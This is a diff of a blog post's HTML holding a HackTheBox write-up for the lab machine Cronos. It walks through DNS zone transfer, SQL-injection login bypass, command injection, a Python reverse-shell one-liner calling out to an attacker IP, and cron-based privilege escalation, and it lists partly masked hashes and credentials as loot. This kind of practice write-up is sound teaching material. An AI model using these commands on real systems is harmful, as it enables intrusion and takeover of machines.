@@ -1,4 +1,49 @@
-<!DOCTYPE html><html lang=en><head><meta charset=utf-8><meta name=author content="Ankur Tyagi (@7h3rAm)"><meta name=description content="Personal Weblog"><meta content="width=device-width, initial-scale=1" name=viewport><title>मंथन | Manthan</title><link rel=icon type=image/webp sizes=32x32 href=/static/images/manthan-32x32.png.webp><link rel=stylesheet type=text/css media=screen href=/static/css/style.rainbow.css><link rel=stylesheet href=/static/css/atelier-forest-light.css><script charset=UTF-8 src=/static/js/highlight.min.js></script><script charset=UTF-8 src=/static/js/highlightjs-line-numbers.min.js></script><script charset=UTF-8 src=/static/js/go.min.js></script></head><body><div class=header><table><tr><td><a href=/index.html class=menu_home>मंथन</a></td><td> | </td><td><a href=/archive.html class=menu_archive>Archive</a></td><td> | </td><td><a href=/tags.html class=menu_tags>Tags</a></td><td> | </td><td><a href=/stats.html class=menu_stats>Stats</a></td></tr></table></div><div class=body><h1 class="h1 collapsible" onclick=toggle(this);>[HackTheBox] CronOS</h1><p><a href=/posts/20191113_htb-blocky.html> « </a>📅 published on <code>13/Nov/2019</code><a href=/posts/20191113_htb-shocker.html> » </a></p><h2 class="h2 collapsible" onclick=toggle(this);>Overview</h2><p class=nested>This is a writeup for HTB VM <a href=https://www.hackthebox.eu/home/machines/profile/11>Cronos</a>. Here are stats for this machine from <a href=https://github.com/7h3rAm/machinescli>machinescli</a>:</p><p class=nested><img alt=writeup.overview.machinescli src=/static/files/posts_htb_cronos/machinescli.png.webp></p><h3 class="h3 collapsible" onclick=toggle(this);>Killchain</h3><p class=nested>Here's the killchain (<code>enumeration</code> → <code>exploitation</code> → <code>privilege escalation</code>) for this machine:</p><p class=nested><img alt=writeup.overview.killchain src=/static/files/posts_htb_cronos/killchain.png.webp></p><h3 class="h3 collapsible" onclick=toggle(this);>TTPs</h3><p class=nested>1. <code>80/tcp/http/Apache httpd 2.4.18 ((Ubuntu))</code>: <a href=https://github.com/7h3rAm/writeups#exploit_sqli>exploit_sqli</a>, <a href=https://github.com/7h3rAm/writeups#privesc_cron>privesc_cron</a></p><h2 class="h2 collapsible" onclick=toggle(this);>Phase #1: Enumeration</h2><p class=nested>1. Here's the Nmap scan result: </p><pre class=nested><code># Nmap 7.70 scan initiated Wed Nov 13 14:08:01 2019 as: nmap -vv --reason -Pn -sV -sC --version-all -oN /root/toolbox/writeups/htb.cronos/results/10.10.10.13/scans/_quick_tcp_nmap.txt -oX /root/toolbox/writeups/htb.cronos/results/10.10.10.13/scans/xml/_quick_tcp_nmap.xml 10.10.10.13
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="utf-8"/>
+    <meta name="author" content="Ankur Tyagi (@7h3rAm)"/>
+    <meta name="description" content="Personal Weblog"/>
+    <meta content="width=device-width, initial-scale=1" name="viewport"/>
+    <title>मंथन | Manthan</title>
+    <link rel="icon" type="image/webp" sizes="32x32" href="/static/images/manthan-32x32.png.webp"/>
+    <link rel="stylesheet" type="text/css" media="screen" href="/static/css/style.rainbow.css"/>
+    <link rel="stylesheet" href="/static/css/atelier-forest-light.css">
+    <!-- <link rel="stylesheet" href="/static/css/atom-one-light.min.css"> -->
+    <!-- <link rel="stylesheet" href="/static/css/default.min.css"> -->
+    <!-- <link rel="stylesheet" href="/static/css/docco.min.css"> -->
+    <!-- <link rel="stylesheet" href="/static/css/github-gist.min.css"> -->
+    <!-- <link rel="stylesheet" href="/static/css/github.min.css"> -->
+    <!-- <link rel="stylesheet" href="/static/css/zenburn.min.css"> -->
+    <script charset="UTF-8" src="/static/js/highlight.min.js"></script>
+    <script charset="UTF-8" src="/static/js/highlightjs-line-numbers.min.js"></script>
+    <script charset="UTF-8" src="/static/js/go.min.js"></script>
+   </head>
+  <body>
+    <div class="header">
+      <table>
+        <tr>
+          <td><a href="/index.html" class="menu_home">मंथन</a></td><td> | </td>
+          <td><a href="/archive.html" class="menu_archive">Archive</a></td><td> | </td>
+          <td><a href="/tags.html" class="menu_tags">Tags</a></td><td> | </td>
+          <td><a href="/stats.html" class="menu_stats">Stats</a></td>
+        </tr>
+      </table>
+    </div>
+    <div class="body">
+          <h1>[HackTheBox] CronOS</h1>
+                  <p><a href="/posts/20191113_htb-blocky.html"> « </a>📅 published on <code>13/Nov/2019</code><a href="/posts/20191113_htb-shocker.html"> » </a></p>
+                <h2>Overview</h2>
+<p>This is a writeup for HTB VM <a href="https://www.hackthebox.eu/home/machines/profile/11">Cronos</a>. Here are stats for this machine from <a href="https://github.com/7h3rAm/machinescli">machinescli</a>:</p>
+<p><img alt="writeup.overview.machinescli" src="/static/files/posts_htb_cronos/machinescli.png.webp" /></p>
+<h3>Killchain</h3>
+<p>Here's the killchain (<code>enumeration</code> → <code>exploitation</code> → <code>privilege escalation</code>) for this machine:</p>
+<p><img alt="writeup.overview.killchain" src="/static/files/posts_htb_cronos/killchain.png.webp" /></p>
+<h3>TTPs</h3>
+<p>1. <code>80/tcp/http/Apache httpd 2.4.18 ((Ubuntu))</code>: <a href="https://github.com/7h3rAm/writeups#exploit_sqli">exploit_sqli</a>, <a href="https://github.com/7h3rAm/writeups#privesc_cron">privesc_cron</a></p>
+<h2>Phase #1: Enumeration</h2>
+<p>1. Here's the Nmap scan result:  </p>
+<pre><code># Nmap 7.70 scan initiated Wed Nov 13 14:08:01 2019 as: nmap -vv --reason -Pn -sV -sC --version-all -oN /root/toolbox/writeups/htb.cronos/results/10.10.10.13/scans/_quick_tcp_nmap.txt -oX /root/toolbox/writeups/htb.cronos/results/10.10.10.13/scans/xml/_quick_tcp_nmap.xml 10.10.10.13
 Nmap scan report for 10.10.10.13
 Host is up, received user-set (0.084s latency).
 Scanned at 2019-11-13 14:08:02 PST for 23s
@@ -26,14 +71,36 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 Read data files from: /usr/bin/../share/nmap
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 # Nmap done at Wed Nov 13 14:08:25 2019 -- 1 IP address (1 host up) scanned in 24.49 seconds
-</code></pre><p class=nested>2. Here's the summary of open ports and associated <a href=https://github.com/Tib3rius/AutoRecon>AutoRecon</a> scan files: </p><p class=nested><img alt=writeup.enumeration.steps.2.1 src=/static/files/posts_htb_cronos/openports.png.webp> </p><p class=nested>3. We start with DNS enumeration and with a reverse lookup and find that the subdomain <code>ns1.cronos.htb</code> is associated with the target IP. Since DNS is responding on TCP, we also perform a DNS zone transfer and find additional subdomains associated with the target IP: </p><pre class=nested><code>dig +noall +answer -x 10.10.10.13 @10.10.10.13
+</code></pre>
+<p>2. Here's the summary of open ports and associated <a href="https://github.com/Tib3rius/AutoRecon">AutoRecon</a> scan files:  </p>
+<p><img alt="writeup.enumeration.steps.2.1" src="/static/files/posts_htb_cronos/openports.png.webp" />  </p>
+<p>3. We start with DNS enumeration and with a reverse lookup and find that the subdomain <code>ns1.cronos.htb</code> is associated with the target IP. Since DNS is responding on TCP, we also perform a DNS zone transfer and find additional subdomains associated with the target IP:  </p>
+<pre><code>dig +noall +answer -x 10.10.10.13 @10.10.10.13
 host -t axfr cronos.htb 10.10.10.13
-</code></pre><p class=nested><img alt=writeup.enumeration.steps.3.1 src=/static/files/posts_htb_cronos/screenshot01.png.webp> </p><p class=nested><img alt=writeup.enumeration.steps.3.2 src=/static/files/posts_htb_cronos/screenshot02.png.webp> </p><p class=nested>4. Upon visiting the <code>admin.cronos.htb</code> subdomain, we are presented with a login page, that is vulnerable to SQL injection: </p><p class=nested><img alt=writeup.enumeration.steps.4.1 src=/static/files/posts_htb_cronos/screenshot03.png.webp> </p><h3 class="h3 collapsible" onclick=toggle(this);>Findings</h3><h4 class="h4 collapsible" onclick=toggle(this);>Open Ports</h4><pre class=nested><code>22/tcp  |  ssh     |  OpenSSH 7.2p2 Ubuntu 4ubuntu2.1 (Ubuntu Linux; protocol 2.0)
+</code></pre>
+<p><img alt="writeup.enumeration.steps.3.1" src="/static/files/posts_htb_cronos/screenshot01.png.webp" />  </p>
+<p><img alt="writeup.enumeration.steps.3.2" src="/static/files/posts_htb_cronos/screenshot02.png.webp" />  </p>
+<p>4. Upon visiting the <code>admin.cronos.htb</code> subdomain, we are presented with a login page, that is vulnerable to SQL injection:  </p>
+<p><img alt="writeup.enumeration.steps.4.1" src="/static/files/posts_htb_cronos/screenshot03.png.webp" />  </p>
+<h3>Findings</h3>
+<h4>Open Ports</h4>
+<pre><code>22/tcp  |  ssh     |  OpenSSH 7.2p2 Ubuntu 4ubuntu2.1 (Ubuntu Linux; protocol 2.0)
 53/tcp  |  domain  |  ISC BIND 9.10.3-P4 (Ubuntu Linux)
 80/tcp  |  http    |  Apache httpd 2.4.18 ((Ubuntu))
-</code></pre><h2 class="h2 collapsible" onclick=toggle(this);>Phase #2: Exploitation</h2><p class=nested>1. We use SQLi to successfully bypass login and are presented with a page that allows running the <code>ping</code> and <code>traceroute</code> commands. The input field on this page is vulnerable to a command injection: </p><p class=nested><img alt=writeup.exploitation.steps.1.1 src=/static/files/posts_htb_cronos/screenshot04.png.webp> </p><p class=nested>2. We use this to execute a Python reverse shell and get interactive access on the target system: </p><pre class=nested><code>nc -nlvp 443
+</code></pre>
+<h2>Phase #2: Exploitation</h2>
+<p>1. We use SQLi to successfully bypass login and are presented with a page that allows running the <code>ping</code> and <code>traceroute</code> commands. The input field on this page is vulnerable to a command injection:  </p>
+<p><img alt="writeup.exploitation.steps.1.1" src="/static/files/posts_htb_cronos/screenshot04.png.webp" />  </p>
+<p>2. We use this to execute a Python reverse shell and get interactive access on the target system:  </p>
+<pre><code>nc -nlvp 443
 python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.10.14.25&quot;,443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);'
-</code></pre><p class=nested><img alt=writeup.exploitation.steps.2.1 src=/static/files/posts_htb_cronos/screenshot05.png.webp> </p><p class=nested><img alt=writeup.exploitation.steps.2.2 src=/static/files/posts_htb_cronos/screenshot06.png.webp> </p><p class=nested>3. We obtain the first flag since the file is readable by current user <code>www-data</code>: </p><p class=nested><img alt=writeup.exploitation.steps.3.1 src=/static/files/posts_htb_cronos/screenshot07.png.webp> </p><h2 class="h2 collapsible" onclick=toggle(this);>Phase #2.5: Post Exploitation</h2><pre class=nested><code>www-data@cronos&gt; id
+</code></pre>
+<p><img alt="writeup.exploitation.steps.2.1" src="/static/files/posts_htb_cronos/screenshot05.png.webp" />  </p>
+<p><img alt="writeup.exploitation.steps.2.2" src="/static/files/posts_htb_cronos/screenshot06.png.webp" />  </p>
+<p>3. We obtain the first flag since the file is readable by current user <code>www-data</code>:  </p>
+<p><img alt="writeup.exploitation.steps.3.1" src="/static/files/posts_htb_cronos/screenshot07.png.webp" />  </p>
+<h2>Phase #2.5: Post Exploitation</h2>
+<pre><code>www-data@cronos&gt; id
 uid=33(www-data) gid=33(www-data) groups=33(www-data)
 www-data@cronos&gt;  
 www-data@cronos&gt; uname
@@ -53,10 +120,56 @@ www-data@cronos&gt;
 www-data@cronos&gt; users
 root
 noulis
-</code></pre><h2 class="h2 collapsible" onclick=toggle(this);>Phase #3: Privilege Escalation</h2><p class=nested>1. While enumerating, we find hardcoded MySQL credentials for user <code>admin</code> within the <code>/var/www/admin/config.php</code> file. We use these credentials to connect to MySQL service and obtain password hash for user <code>admin</code>. We were unable to crack this hash: </p><p class=nested><img alt=writeup.privesc.steps.1.1 src=/static/files/posts_htb_cronos/screenshot08.png.webp> </p><p class=nested><img alt=writeup.privesc.steps.1.2 src=/static/files/posts_htb_cronos/screenshot09.png.webp> </p><p class=nested>2. Upon further enumeration, we find that there's a cronjob that run a PHP file every minute with <code>root</code> privileges. Luckily for us, the PHP file it runs is owned by current user <code>www-data</code>: </p><p class=nested><img alt=writeup.privesc.steps.2.1 src=/static/files/posts_htb_cronos/screenshot10.png.webp> </p><p class=nested><img alt=writeup.privesc.steps.2.2 src=/static/files/posts_htb_cronos/screenshot11.png.webp> </p><p class=nested>3. We can replace this file with a PHP reverse shell and catch the incoming shell to obtain elevated privileges: </p><p class=nested><img alt=writeup.privesc.steps.3.1 src=/static/files/posts_htb_cronos/screenshot12.png.webp> </p><p class=nested><img alt=writeup.privesc.steps.3.2 src=/static/files/posts_htb_cronos/screenshot13.png.webp> </p><p class=nested>4. We then view the contents of the <code>root.txt</code> file to complete the challenge: </p><p class=nested><img alt=writeup.privesc.steps.4.1 src=/static/files/posts_htb_cronos/screenshot14.png.webp> </p><h2 class="h2 collapsible" onclick=toggle(this);>Loot</h2><h3 class="h3 collapsible" onclick=toggle(this);>Hashes</h3><pre class=nested><code>root:$6$L2m6DJwN$p/xas4tCNp19sda4q2ZzGC82Ix7GiEb7xvCbzWCsFHs/eR82G4/YOnni/.L69tpCkOGo5lm0AU7zh9lP5........................
+</code></pre>
+<h2>Phase #3: Privilege Escalation</h2>
+<p>1. While enumerating, we find hardcoded MySQL credentials for user <code>admin</code> within the <code>/var/www/admin/config.php</code> file. We use these credentials to connect to MySQL service and obtain password hash for user <code>admin</code>. We were unable to crack this hash:  </p>
+<p><img alt="writeup.privesc.steps.1.1" src="/static/files/posts_htb_cronos/screenshot08.png.webp" />  </p>
+<p><img alt="writeup.privesc.steps.1.2" src="/static/files/posts_htb_cronos/screenshot09.png.webp" />  </p>
+<p>2. Upon further enumeration, we find that there's a cronjob that run a PHP file every minute with <code>root</code> privileges. Luckily for us, the PHP file it runs is owned by current user <code>www-data</code>:  </p>
+<p><img alt="writeup.privesc.steps.2.1" src="/static/files/posts_htb_cronos/screenshot10.png.webp" />  </p>
+<p><img alt="writeup.privesc.steps.2.2" src="/static/files/posts_htb_cronos/screenshot11.png.webp" />  </p>
+<p>3. We can replace this file with a PHP reverse shell and catch the incoming shell to obtain elevated privileges:  </p>
+<p><img alt="writeup.privesc.steps.3.1" src="/static/files/posts_htb_cronos/screenshot12.png.webp" />  </p>
+<p><img alt="writeup.privesc.steps.3.2" src="/static/files/posts_htb_cronos/screenshot13.png.webp" />  </p>
+<p>4. We then view the contents of the <code>root.txt</code> file to complete the challenge:  </p>
+<p><img alt="writeup.privesc.steps.4.1" src="/static/files/posts_htb_cronos/screenshot14.png.webp" />  </p>
+<h2>Loot</h2>
+<h3>Hashes</h3>
+<pre><code>root:$6$L2m6DJwN$p/xas4tCNp19sda4q2ZzGC82Ix7GiEb7xvCbzWCsFHs/eR82G4/YOnni/.L69tpCkOGo5lm0AU7zh9lP5........................
 www-data:$6$SYixzIan$P3cvyztSwA1lmILF3kpKcqZpYSDONYwMwplB62RWu1RklKqIGCX1zleXuVwzxjLcpU6bhiW9N03AWkzVU........................
 noulis:$6$ApsLg5.I$Zd9blHPGRHAQOab94HKuQFtJ8m7ob8MFnX6WIIr0Aah6pW/aZ.yA3T1iU13lCSixrh6NG1.GHPl.QbjHS........................
-</code></pre><h3 class="h3 collapsible" onclick=toggle(this);>Credentials</h3><pre class=nested><code>mysql: admin/kEjdbRigfBHURE.....
-</code></pre><h3 class="h3 collapsible" onclick=toggle(this);>Flags</h3><pre class=nested><code>/home/noulis/user.txt: 51d236438b333970dbba7...........
+</code></pre>
+<h3>Credentials</h3>
+<pre><code>mysql: admin/kEjdbRigfBHURE.....
+</code></pre>
+<h3>Flags</h3>
+<pre><code>/home/noulis/user.txt: 51d236438b333970dbba7...........
 /root/root.txt: 1703b8a3c9a8dde879942c..........
-</code></pre><h2 class="h2 collapsible" onclick=toggle(this);>References</h2><ul class=nested><li><a href=https://www.hackthebox.eu/home/machines/profile/11>https://www.hackthebox.eu/home/machines/profile/11</a> </li><li><a href="https://www.youtube.com/watch?v=CYeVUmOar3I">https://www.youtube.com/watch?v=CYeVUmOar3I</a> </li><li><a href=https://medium.com/cronos-htb-walkthough/cronos-htb-walkthrough-9ef91750726>https://medium.com/cronos-htb-walkthough/cronos-htb-walkthrough-9ef91750726</a> </li></ul><p style=text-align:center;>(🔖 tagged <a href=/tags.html#hackthebox>hackthebox</a> and <a href=/tags.html#writeup>writeup</a>)</p><p style=text-align:center;>« <a href=/posts/20191113_htb-blocky.html>[HackTheBox] Blocky...</a> « | » <a href=/posts/20191113_htb-shocker.html>[HackTheBox] Shocker...</a> »</p></div><script>hljs.initHighlightingOnLoad();</script><script>hljs.initLineNumbersOnLoad();</script><script>function toggle(s){s.classList.toggle("expanded");var t=!1,i=!1,a=!1;s.classList.contains("h2")&&(t=!0),s.classList.contains("h3")&&(i=!0),s.classList.contains("h4")&&(a=!0),console.log(s),console.log(t),console.log(i),console.log(a);for(var l=s.nextElementSibling;l;){if(t&&l.classList.contains("h2")){l.classList.toggle("active");break}if(i&&(l.classList.contains("h2")||l.classList.contains("h3"))){l.classList.toggle("active");break}if(a&&(l.classList.contains("h2")||l.classList.contains("h3")||l.classList.contains("h4"))){l.classList.toggle("active");break}l.classList.contains("collapsible")&&l.classList.toggle("expanded"),l.classList.toggle("active"),l=l.nextElementSibling}}</script><script data-goatcounter=https://manthan.goatcounter.com/count async src=//gc.zgo.at/count.js></script><div class="footer footercenter"><span><a href=https://creativecommons.org/licenses/by-sa/4.0/ class=footspan>  </a></span></div></body></html>
+</code></pre>
+<h2>References</h2>
+<ul>
+<li><a href="https://www.hackthebox.eu/home/machines/profile/11">https://www.hackthebox.eu/home/machines/profile/11</a>  </li>
+<li><a href="https://www.youtube.com/watch?v=CYeVUmOar3I">https://www.youtube.com/watch?v=CYeVUmOar3I</a>  </li>
+<li><a href="https://medium.com/cronos-htb-walkthough/cronos-htb-walkthrough-9ef91750726">https://medium.com/cronos-htb-walkthough/cronos-htb-walkthrough-9ef91750726</a>  </li>
+</ul>
+        <p style="text-align:center;">(🔖 tagged <a href=/tags.html#hackthebox>hackthebox</a> and <a href=/tags.html#writeup>writeup</a>)</p>
+                  <p style="text-align:center;">« <a href="/posts/20191113_htb-blocky.html">[HackTheBox] Blocky...</a> « | » <a href="/posts/20191113_htb-shocker.html">[HackTheBox] Shocker...</a> »</p>
+            </div>
+    <div class="footer footercenter">
+      <span>
+        <a href=https://creativecommons.org/licenses/by-sa/4.0/ class=footspan>  </a>
+      </span>
+    </div>
+    <script>hljs.initHighlightingOnLoad();</script>
+    <script>hljs.initLineNumbersOnLoad();</script>
+    <script>
+      function toggle(s){
+        s.classList.toggle("expanded");
+        for(var l=s.nextElementSibling;l;){
+          l.classList.contains("collapsible")&&l.classList.toggle("expanded"),l.classList.toggle("active"),l=l.nextElementSibling
+        }
+      }
+    </script>
+    <script data-goatcounter=https://manthan.goatcounter.com/count async src=//gc.zgo.at/count.js></script>
+  </body>
+</html>
